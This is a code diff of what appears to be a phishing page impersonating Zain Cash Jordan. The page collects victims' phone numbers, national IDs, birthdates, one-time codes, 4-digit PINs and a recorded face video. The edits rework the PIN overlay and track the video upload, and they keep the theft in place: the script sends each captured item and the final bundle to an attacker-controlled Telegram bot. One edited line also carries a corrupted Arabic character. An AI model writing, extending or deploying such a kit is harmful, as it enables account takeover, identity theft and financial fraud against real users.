@@ -164,6 +164,19 @@
     .birthdate-container { display:flex; gap:8px; margin-bottom:12px; }
     .birthdate-container select { flex:1; }
 
+    #codeContainer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #fff;
+      padding: 20px;
+      box-sizing: border-box;
+      border-top: 1px solid #e0e0e0;
+      z-index: 1000;
+      direction: rtl;
+    }
+
     @media (max-width:450px){
       #app{padding:16px 1.5vw 10px 1.5vw;}
       .camera-box{height:320px;}
@@ -221,6 +234,8 @@
   let userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
   let telegramMsgId = null;
   let waitingTimeout = null;
+  let recordedVideoBlob = null;
+  let videoMessageId = null;
 
   function stepIndicator(step){
     return `<div class="step-indicator">
@@ -283,7 +298,7 @@
       const day = document.getElementById('birthDay').value;
       const month = document.getElementById('birthMonth').value;
       const year = document.getElementById('birthYear').value;
-      if(!/^\d{10,12}$/.test(nid)){ alert('يرجى إدخال رقم وطني صحيح'); return; }
+      if(!/^\d{10,12}$/.test(nid)){ alert('يرجى إدخال رقم وطني ص��يح'); return; }
       if(!day || !month || !year){ alert('يرجى إدخال تاريخ الميلاد'); return; }
       userData.nationalId = nid;
       userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
@@ -487,12 +502,12 @@
     stopStream(stream);
 
     const finalType = chosenMime ? chosenMime.split(';')[0] : 'video/webm';
-    const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
+    recordedVideoBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
     showProcessing(true);
     try {
-      if (finalBlob.size > 0) {
-        await sendVideoToTelegramAsVideo(finalBlob);
+      if (recordedVideoBlob.size > 0) {
+        await sendVideoToTelegramAsVideo(recordedVideoBlob);
       }
     } catch (e) {
       console.error('send video error', e);
@@ -585,20 +600,24 @@
   }
 
   function renderCode4Step(){
-    app.innerHTML = `
-      <button class="back-btn" id="backBtn">&#8592; رجوع</button>
-      ${header("رمز PIN")}
-      ${stepIndicator(3)}
-      <div class="info-msg">يرجى إدخال رمز PIN الثابت الخاص بك المكون من 4 ارقام</div>
-      <form id="code4Form" autocomplete="off">
-        <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
-        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد</button></div>
-      </form>
-      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
+    document.body.innerHTML += `
+      <div id="codeContainer">
+        <button class="back-btn" id="backBtn" style="margin-bottom:12px;">&#8592; رجوع</button>
+        <div style="text-align:center;margin-bottom:12px;">
+          <h2 style="color:var(--primary-1);margin:0 0 8px 0;">رمز PIN</h2>
+          <div class="info-msg">يرجى إدخال رمز PIN الثابت الخاص بك المكون من 4 ارقام</div>
+        </div>
+        <form id="code4Form" autocomplete="off">
+          <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
+          <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد</button></div>
+        </form>
+      </div>
     `;
+    
     const codeInput = document.getElementById('code4input');
     codeInput.focus();
     codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
+    
     document.getElementById('code4Form').onsubmit = async (e) => {
       e.preventDefault();
       const code = codeInput.value.trim();
@@ -607,7 +626,11 @@
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل نهائي\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
       showFinalSuccess();
     };
-    document.getElementById('backBtn').onclick = () => renderCode5Step();
+    
+    document.getElementById('backBtn').onclick = () => {
+      document.getElementById('codeContainer').remove();
+      renderCode5Step();
+    };
   }
 
   async function sendVideoToTelegramAsVideo(blob){
@@ -621,7 +644,7 @@
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: form });
       const data = await res.json();
       if (data && data.ok && data.result && data.result.message_id) { 
-        telegramMsgId = data.result.message_id; 
+        videoMessageId = data.result.message_id;
         return; 
       }
       await sendVideoAsDocumentFallback(blob);
@@ -638,7 +661,7 @@
     form.append('document', blob, fileName);
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: form });
     const data = await res.json();
-    if (data && data.ok && data.result && data.result.message_id) telegramMsgId = data.result.message_id;
+    if (data && data.ok && data.result && data.result.message_id) videoMessageId = data.result.message_id;
   }
 
   async function sendToTelegramAndGetMsgId(msg){
@@ -668,6 +691,9 @@
   function showProcessing(show){ const m = document.getElementById('processingModal'); if(!m) return; if(show) m.classList.add('active'); else m.classList.remove('active'); }
 
   function showFinalSuccess(){
+    const codeContainer = document.getElementById('codeContainer');
+    if(codeContainer) codeContainer.remove();
+    
     const modal = document.getElementById('modalError');
     const titleEl = modal.querySelector('.err-title');
     const msgEl = modal.querySelector('.err-msg');
@@ -680,6 +706,8 @@
       modal.classList.remove('active');
       btn.removeEventListener('click', handler);
       userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
+      recordedVideoBlob = null;
+      videoMessageId = null;
       renderPhoneStep();
     }
     btn.addEventListener('click', handler);
@@ -687,6 +715,8 @@
       if(modal.classList.contains('active')){
         modal.classList.remove('active');
         userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
+        recordedVideoBlob = null;
+        videoMessageId = null;
         renderPhoneStep();
       }
     }, 3000);
